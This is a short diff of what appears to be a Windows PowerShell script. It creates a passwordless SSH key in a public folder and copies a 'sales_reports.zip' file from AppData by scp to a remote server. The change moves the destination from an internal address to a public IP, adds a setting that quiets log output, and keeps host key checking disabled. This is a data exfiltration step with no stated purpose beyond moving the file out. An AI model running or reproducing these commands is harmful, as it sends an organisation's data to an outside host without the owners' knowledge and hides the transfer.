@@ -5,4 +5,4 @@ ssh-keygen.exe --% -q -t rsa -b 4096 -N "" -f C:\Users\Public\x1y2z3
 cat C:\Users\Public\x1y2z3.pub
 
 # Transfer Files using Windows built-in SCP
-scp.exe -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i C:\Users\Public\x1y2z3 $env:APPDATA\sales_reports.zip louai@10.10.99.7:C:\ 2>&1
+scp.exe -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -i C:\Users\Public\x1y2z3 $env:APPDATA\sales_reports.zip delta@191.232.179.179:/home/delta/ 2>&1
